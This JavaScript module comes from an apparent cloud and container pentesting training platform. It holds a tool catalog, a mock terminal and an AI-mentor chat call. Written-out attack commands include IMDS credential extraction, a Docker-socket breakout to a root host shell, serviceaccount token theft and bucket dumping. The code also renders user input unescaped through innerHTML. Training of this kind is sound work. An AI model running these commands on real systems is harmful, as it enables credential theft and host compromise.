// ==========================================
// PWNBOX MODULE 09: CLOUD & CONTAINER SECURITY
// Multi-Cloud & Kubernetes Pentesting Arsenal
// ==========================================
const apiKey = (typeof window !== "undefined" && window.GROQ_API_KEY) || 
                 (typeof GROQ_API_KEY !== "undefined" ? GROQ_API_KEY : "") || 
                 localStorage.getItem('pwnbox_groq_api_key') || 
                 "";

const MODULE_KEY        = 'module_cloudsec_completed';
const CUSTOM_TOOLS_KEY  = 'cloudsec_custom_tools';
const EDITED_TOOLS_KEY  = 'cloudsec_edited_default_tools';
const DELETED_TOOLS_KEY = 'cloudsec_deleted_default_indices';
const CUSTOM_CATS_KEY   = 'cloudsec_custom_categories';

const defaultTools = [
    {
        name: "1. Pacu & ScoutSuite (AWS Attack Framework)",
        link: "https://github.com/RhinoSecurityLabs/pacu",
        category: "CloudAudit",
        brief: "The premier open-source AWS exploitation framework developed by Rhino Security Labs. Designed specifically for offensive security practitioners, Pacu enables operators to perform automated privilege escalation, enumerate unmonitored IAM roles, bypass AWS CloudTrail logging via evasive API calls, and dump database snapshots across multi-account AWS Organizations.",
        use: "Launch Pacu interactive console: <code>pacu</code><br>Set compromised API keys: <code>set_keys</code><br>Enumerate IAM permissions: <code>run iam__enum_permissions</code><br>Scan for privilege escalation paths: <code>run iam__privesc_scan</code>",
        useful: "Most cloud breaches occur not through 0-days, but through overly permissive IAM policies (e.g. <code>iam:CreateAccessKey</code> or <code>iam:PassRole</code>). Pacu algorithmically identifies and executes all 21 known AWS IAM escalation methods in minutes."
    },
    {
        name: "2. IMDSv1 & IMDSv2 Metadata Hunter",
        link: "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html",
        category: "CloudPivoting",
        brief: "The non-routable link-local IP address (169.254.169.254) accessible by all AWS EC2 instances, Google Cloud Compute Engine, and Azure VMs. When web apps suffer from Server-Side Request Forgery (SSRF), attackers query this endpoint to extract temporary STS IAM instance credentials, API keys, and user-data initialization scripts containing secrets.",
        use: "IMDSv1 direct extraction:<br><code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/</code><br>IMDSv2 token acquisition & query:<br><code>TOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")<br>curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role</code>",
        useful: "The cornerstone of cloud web application breaches (as seen in the famous Capital One incident). IMDSv2 introduces stateful session tokens and hop-limit boundaries to mitigate SSRF."
    },
    {
        name: "3. Trivy & Grype (Container & SBOM Scanner)",
        link: "https://github.com/aquasecurity/trivy",
        category: "ContainerSecurity",
        brief: "Comprehensive, lightning-fast security scanner for container images, file systems, Git repositories, and Kubernetes clusters. It detects known CVEs, hardcoded API secrets, licenses, and Infrastructure as Code (IaC) misconfigurations within Docker and OCI images before deployment into production registries.",
        use: "Scan remote Docker image: <code>trivy image --severity HIGH,CRITICAL python:3.9-slim</code><br>Scan Kubernetes pod manifest: <code>trivy k8s --report summary cluster</code><br>Audit Terraform directory: <code>trivy config ./terraform/</code>",
        useful: "Software Supply Chain security is mandatory in modern devops. Trivy generates CycloneDX/SPDX Software Bill of Materials (SBOM) and catches vulnerable base images before attackers weaponize them."
    },
    {
        name: "4. Docker Socket & Privileged Escape",
        link: "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout",
        category: "ContainerEscape",
        brief: "Techniques abused to break out of isolated container runtimes into the underlying host operating system. The most common misconfiguration occurs when developers mount the host Docker UNIX socket (<code>/var/run/docker.sock</code>) inside a CI/CD container, or run containers with <code>--privileged</code> flags granting raw device access (<code>cap_sys_admin</code>).",
        use: "Mounted socket breakout (spawns root shell on host):<br><code>docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash</code><br>Privileged device breakout:<br><code>mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && ...</code>",
        useful: "Container isolation is not a security sandbox boundary unless properly restricted with Seccomp, AppArmor, non-root user execution, and read-only root filesystems."
    },
    {
        name: "5. Kube-Hunter & Peirates (Kubernetes Attack Matrix)",
        link: "https://github.com/aquasecurity/kube-hunter",
        category: "K8sSecurity",
        brief: "Kubernetes penetration testing and attack automation frameworks. Kube-Hunter hunts for open security weaknesses in clusters (like unauthenticated Kubelet API ports 10250/10255, exposed etcd databases on port 2379, and insecure API servers), while Peirates automates cluster privilege escalation from a compromised pod.",
        use: "Active cluster scanning:<br><code>kube-hunter --remote 192.168.1.100 --active</code><br>Check compromised pod RBAC privileges:<br><code>kubectl auth can-i --list</code><br>Extract serviceaccount secret token:<br><code>cat /var/run/secrets/kubernetes.io/serviceaccount/token</code>",
        useful: "Modern microservices run on Kubernetes. Gaining pod access is only step one; stealing cluster tokens and escalating to ClusterRoleBinding enables complete cloud infrastructure compromise."
    },
    {
        name: "6. Checkov & tfsec (IaC SAST Scanner)",
        link: "https://github.com/bridgecrewio/checkov",
        category: "IaCSecurity",
        brief: "Static code analysis tools for Infrastructure as Code (IaC). Scans Terraform, Terraform Plan, CloudFormation, AWS SAM, Kubernetes, Helm charts, and Dockerfiles to prevent security flaws (such as open security groups <code>0.0.0.0/0</code>, unencrypted S3 buckets, and wildcard IAM permissions) from being provisioned.",
        use: "Scan directory of Terraform files:<br><code>checkov -d ./infrastructure --framework terraform</code><br>Run fast tfsec audit with concise output:<br><code>tfsec . --format compact</code>",
        useful: "Shift-Left cloud security: fixing cloud misconfigurations at the code level costs 100x less time and money than responding to active cloud breach incident responses."
    },
    {
        name: "7. S3Scanner & CloudBrute (Object Storage Recon)",
        link: "https://github.com/sa7mon/S3Scanner",
        category: "CloudStorage",
        brief: "Automated scanning and brute-forcing tools that locate public and misconfigured cloud object storage repositories across AWS S3, Google Cloud Storage (GCS), Azure Blob Storage, and DigitalOcean Spaces. It inspects public ACLs, read/write permissions, and anonymous file listings.",
        use: "Scan single bucket: <code>s3scanner scan --bucket confidential-corp-data</code><br>Dump publicly exposed files: <code>s3scanner dump --bucket target-bucket</code><br>Brute-force cloud assets via wordlist: <code>cloudbrute -d target.com -k wordlist.txt</code>",
        useful: "Leaked databases, database backup archives (.sql.gz), customer PII, and TLS private keys are regularly discovered by red teams in misconfigured public storage buckets."
    }
];

// --- STORAGE & TOOL MANAGEMENT ---
function getStoredCustomTools() {
    return JSON.parse(localStorage.getItem(CUSTOM_TOOLS_KEY) || '[]');
}

function getAllTools() {
    const custom = getStoredCustomTools();
    return [...defaultTools, ...custom];
}

function renderToolList() {
    const list = document.getElementById('toolList');
    if (!list) return;
    list.innerHTML = '';
    const tools = getAllTools();

    tools.forEach((t) => {
        const item = document.createElement('div');
        item.className = 'tool-item';
        item.innerHTML = `
            <div style="font-weight: 700; color: var(--text-main); font-size: 0.88rem;">${t.name}</div>
            <div style="font-family: 'Space Mono', monospace; font-size: 0.68rem; color: #0284c7; margin-top: 2px;">[${t.category}]</div>
        `;
        item.addEventListener('click', () => {
            document.querySelectorAll('.tool-item').forEach(el => el.classList.remove('active'));
            item.classList.add('active');
            renderToolDetails(t);
        });
        list.appendChild(item);
    });
}

function renderToolDetails(tool) {
    const panel = document.getElementById('detailsPanel');
    if (!panel) return;
    panel.innerHTML = `
        <div style="margin-bottom: 20px;">
            <div style="font-family: 'Space Mono', monospace; font-size: 0.72rem; color: #0284c7; font-weight: 800; margin-bottom: 4px;">CATEGORY: ${tool.category}</div>
            <h2 style="font-size: 1.5rem; font-weight: 900; margin-bottom: 8px;">${tool.name}</h2>
            <a href="${tool.link}" target="_blank" style="font-family: 'Space Mono', monospace; font-size: 0.75rem; color: #005A9C; text-decoration: underline;">🔗 Official Repository / Technical Reference ↗</a>
        </div>
        
        <div style="background: var(--bg-panel); border: 2px solid var(--border-dim); padding: 16px; margin-bottom: 16px; box-shadow: 3px 3px 0 var(--border-dim);">
            <h4 style="font-family: 'Space Mono', monospace; font-size: 0.82rem; margin-bottom: 6px; color: var(--text-main);">// ARCHITECTURAL OVERVIEW</h4>
            <p style="font-size: 0.88rem; line-height: 1.6; color: var(--text-muted);">${tool.brief}</p>
        </div>

        <div style="background: #010409; border: 2px solid var(--border-dim); padding: 16px; margin-bottom: 16px; color: #38bdf8; font-family: 'Space Mono', monospace; box-shadow: 3px 3px 0 var(--border-dim);">
            <div style="font-size: 0.75rem; color: #0284c7; font-weight: 800; margin-bottom: 8px;"># CLOUD COMMAND INVOCATION</div>
            <div style="font-size: 0.8rem; line-height: 1.6; word-break: break-all;">${tool.use}</div>
        </div>

        <div style="background: var(--bg-panel); border: 2px solid var(--border-dim); padding: 16px; box-shadow: 3px 3px 0 var(--border-dim);">
            <h4 style="font-family: 'Space Mono', monospace; font-size: 0.82rem; margin-bottom: 6px; color: #10b981;">// CLOUD AUDIT UTILITY</h4>
            <p style="font-size: 0.88rem; line-height: 1.6; color: var(--text-muted);">${tool.useful}</p>
        </div>
    `;
}

// --- PANEL TAB SWITCHING ---
function switchPanelTab(tabName) {
    document.querySelectorAll('.panel-tab').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => {
        c.classList.remove('active');
        c.style.display = 'none';
    });

    if (tabName === 'chat') {
        const btn = document.querySelector(".panel-tab[onclick*='chat']");
        if (btn) btn.classList.add('active');
        const cont = document.getElementById('chatTabContent');
        if (cont) { cont.classList.add('active'); cont.style.display = 'flex'; }
    } else if (tabName === 'terminal') {
        const btn = document.querySelector(".panel-tab[onclick*='terminal']");
        if (btn) btn.classList.add('active');
        const cont = document.getElementById('terminalTabContent');
        if (cont) { cont.classList.add('active'); cont.style.display = 'flex'; }
    } else if (tabName === 'quiz') {
        const btn = document.querySelector(".panel-tab[onclick*='quiz']");
        if (btn) btn.classList.add('active');
        const cont = document.getElementById('quizTabContent');
        if (cont) { cont.classList.add('active'); cont.style.display = 'flex'; }
    }
}

// --- TERMINAL COMMAND SANDBOX ---
function handleTerminalEnter(e) {
    if (e.key === 'Enter') {
        const input = document.getElementById('terminalInput');
        const cmd = input.value.trim().toLowerCase();
        input.value = '';
        executeTerminalCommand(cmd);
    }
}

function executeTerminalCommand(cmd) {
    const output = document.getElementById('terminalOutput');
    if (!output) return;

    const row = document.createElement('div');
    row.style.marginBottom = '6px';
    row.innerHTML = `<span style="color: #38bdf8;">cloud-operator@aws-pod:~$</span> <span style="color: #ffffff;">${cmd}</span>`;
    output.appendChild(row);

    const res = document.createElement('div');
    res.style.marginBottom = '12px';

    if (cmd === 'help') {
        res.innerHTML = `
            <div style="color: #0284c7; font-weight: bold;">AVAILABLE CLOUD OPERATIONS COMMANDS:</div>
            <div>- <b>imds</b>: Query AWS IMDSv2 metadata service for STS session tokens</div>
            <div>- <b>s3-enum</b>: Scan object storage buckets for public read/write ACLs</div>
            <div>- <b>docker-breakout</b>: Execute socket container escape to host namespace</div>
            <div>- <b>kubectl-can-i</b>: Inspect Kubernetes RBAC permissions for current pod ServiceAccount</div>
            <div>- <b>clear</b>: Clear terminal display</div>
        `;
    } else if (cmd === 'imds') {
        res.innerHTML = `
            <span style="color: #10b981;">[+] Step 1: Requesting IMDSv2 Session Token from 169.254.169.254...<br/>
            [+] PUT /latest/api/token -> Received Token: AQAAANcm4... (TTL: 21600s)<br/>
            [+] Step 2: Querying STS IAM Instance Profile Credentials with X-aws-ec2-metadata-token...<br/>
            [✓] EXTRACTED TEMPORARY IAM CREDENTIALS:<br/>
            &nbsp;&nbsp;AccessKeyId: ASIAIOSFODNN7EXAMPLE<br/>
            &nbsp;&nbsp;SecretAccessKey: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY<br/>
            &nbsp;&nbsp;Token: IQoJb3JpZ2luX2Vj...<br/>
            &nbsp;&nbsp;Expiration: 2026-11-07T04:12:00Z</span>
        `;
    } else if (cmd === 's3-enum') {
        res.innerHTML = `
            <span style="color: #eab308;">[*] Scanning s3://acme-corp-prod-backups...<br/>
            [!] Status: PUBLIC ACCESS ENABLED (AllUsers: READ)<br/>
            [+] Found 4 objects:<br/>
            &nbsp;&nbsp;- 2026-11-01_db_dump.sql.gz (1.4 GB)<br/>
            &nbsp;&nbsp;- id_rsa_backup.pem (3.2 KB)<br/>
            &nbsp;&nbsp;- production.env (1.8 KB)<br/>
            &nbsp;&nbsp;- customer_pii_export.csv (84.1 MB)<br/>
            [✓] High-severity data exposure confirmed.</span>
        `;
    } else if (cmd === 'docker-breakout') {
        res.innerHTML = `
            <span style="color: #f43f5e;">[*] Checking /var/run/docker.sock socket permissions...<br/>
            [+] Docker socket writable: srw-rw---- 1 root docker<br/>
            [+] Executing: docker run -v /:/host -it alpine chroot /host /bin/sh<br/>
            [✓] CONTAINER BREAKOUT COMPLETE: root@ip-10-0-1-42:/# whoami -> root<br/>
            [+] Host filesystem accessible under /host. Container namespace escaped.</span>
        `;
    } else if (cmd === 'kubectl-can-i') {
        res.innerHTML = `
            <span style="color: #38bdf8;">[*] Querying Kubernetes API server (https://10.96.0.1:443)...<br/>
            [+] Evaluating ServiceAccount: default:sa-web-deployer<br/>
            &nbsp;&nbsp;pods .................... CREATE, GET, LIST, WATCH, DELETE<br/>
            &nbsp;&nbsp;secrets ................. GET, LIST [CRITICAL: Cluster secrets exposed]<br/>
            &nbsp;&nbsp;deployments ............. *<br/>
            [!] Escalation vector: ServiceAccount has permission to read cluster secrets!</span>
        `;
    } else if (cmd === 'clear') {
        output.innerHTML = '';
        return;
    } else {
        res.innerHTML = `<span style="color: #ef4444;">Command not recognized. Type 'help' to view cloud operations commands.</span>`;
    }

    output.appendChild(res);
    output.scrollTop = output.scrollHeight;
}

// --- QUIZ VERIFICATION ---
function checkQuizAnswer(qNum, correctVal) {
    const selected = document.querySelector(`input[name="q${qNum}"]:checked`);
    if (!selected) return;

    if (selected.value === correctVal) {
        if (typeof window.showCustomAlert === 'function') {
            window.showCustomAlert("✓ CORRECT!", "Outstanding! You identified the proper cloud and container security mechanism.", "success");
        } else if (typeof window.tacticalAlert === 'function') {
            window.tacticalAlert({ title: "✓ CORRECT!", message: "Outstanding! You identified the proper cloud security mechanism.", type: "success" });
        } else {
            alert("✓ CORRECT! That is the proper cloud security mechanism.");
        }
    } else {
        if (typeof window.showCustomAlert === 'function') {
            window.showCustomAlert("✕ INCORRECT", "Review the IMDS, Docker breakout, or K8s RBAC notes and try again.", "error");
        } else if (typeof window.tacticalAlert === 'function') {
            window.tacticalAlert({ title: "✕ INCORRECT", message: "Review the cloud security notes and try again.", type: "danger" });
        } else {
            alert("✕ INCORRECT. Review the cloud security notes.");
        }
    }
}

// --- AI MENTOR (GROQ INTEGRATION) ---
async function sendMessage() {
    const input = document.getElementById('chatInput');
    const msg = input.value.trim();
    if (!msg) return;

    const history = document.getElementById('chatHistory');
    const userDiv = document.createElement('div');
    userDiv.className = 'msg user';
    userDiv.textContent = msg;
    history.appendChild(userDiv);
    input.value = '';

    const botDiv = document.createElement('div');
    botDiv.className = 'msg bot';
    botDiv.textContent = 'Querying Cloud Intelligence Oracle...';
    history.appendChild(botDiv);
    history.scrollTop = history.scrollHeight;

    try {
        const response = await fetch("https://api.groq.com/openai/v1/chat/completions", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apiKey}`
            },
            body: JSON.stringify({
                model: "llama-3.3-70b-versatile",
                messages: [
                    {
                        role: "system",
                        content: "You are an elite Cloud & Container Security Mentor on the PwnBox cybersecurity training platform. Explain AWS, Azure, Docker, Kubernetes, and IaC exploitation and defense clearly with practical terminal examples and Hinglish analogies if appropriate."
                    },
                    { role: "user", content: msg }
                ],
                temperature: 0.5,
                max_tokens: 600
            })
        });

        if (!response.ok) throw new Error("API request failed");
        const data = await response.json();
        botDiv.textContent = data.choices[0].message.content;
    } catch (e) {
        botDiv.textContent = "Downlink failed. Ensure Groq API key is valid in js/config.js or test commands in the Cloud CLI Sandbox tab.";
    }
    history.scrollTop = history.scrollHeight;
}

function handleEnter(e) {
    if (e.key === 'Enter') sendMessage();
}

// Module completion
function toggleModuleCompletion() {
    const isCompleted = localStorage.getItem(MODULE_KEY) === 'true';
    if (isCompleted) {
        localStorage.removeItem(MODULE_KEY);
        document.getElementById('completeModuleBtn').textContent = 'Mark Module Completed';
        document.getElementById('completeModuleBtn').style.background = '';
    } else {
        localStorage.setItem(MODULE_KEY, 'true');
        document.getElementById('completeModuleBtn').textContent = '✓ Module Completed!';
        document.getElementById('completeModuleBtn').style.background = '#10b981';
        if (typeof window.showCustomAlert === 'function') {
            window.showCustomAlert("MODULE COMPLETED!", "Module 09 (Cloud & Container Security) completion recorded in local dossier.", "success");
        }
    }
}

// Custom Tool Modal
function openAddToolModal() {
    const modal = document.getElementById('addToolModal');
    if (modal) {
        modal.style.display = 'flex';
        setTimeout(() => modal.classList.add('active'), 10);
    }
}

function closeAddToolModal() {
    const modal = document.getElementById('addToolModal');
    if (modal) {
        modal.classList.remove('active');
        setTimeout(() => { modal.style.display = 'none'; }, 200);
    }
}

function saveCustomTool() {
    const name = document.getElementById('customToolName').value.trim();
    const cat = document.getElementById('customToolCategory').value.trim();
    const desc = document.getElementById('customToolDesc').value.trim();
    const syn = document.getElementById('customToolSyntax').value.trim();

    if (!name || !cat) return;

    const list = getStoredCustomTools();
    list.push({
        name: name,
        category: cat,
        brief: desc || "Custom user tool.",
        use: syn || "No command provided.",
        useful: "Custom cloud security addition.",
        link: "#"
    });
    localStorage.setItem(CUSTOM_TOOLS_KEY, JSON.stringify(list));
    const form = document.getElementById('addToolForm');
    if (form) form.reset();
    closeAddToolModal();
    renderToolList();
    if (typeof window.showCustomAlert === 'function') {
        window.showCustomAlert("CLOUD TOOL ADDED", `${name} added to your private Cloud Security arsenal!`, "success");
    }
}

// Initialization
document.addEventListener('DOMContentLoaded', () => {
    renderToolList();
    if (defaultTools[0]) renderToolDetails(defaultTools[0]);
    if (localStorage.getItem(MODULE_KEY) === 'true') {
        const btn = document.getElementById('completeModuleBtn');
        if (btn) {
            btn.textContent = '✓ Module Completed!';
            btn.style.background = '#10b981';
        }
    }
});

if (typeof window !== 'undefined') {
    window.defaultTools = defaultTools;
    window.getAllTools = getAllTools;
    window.executeTerminalCommand = executeTerminalCommand;
    window.toggleModuleCompletion = toggleModuleCompletion;
    window.saveCustomTool = saveCustomTool;
}
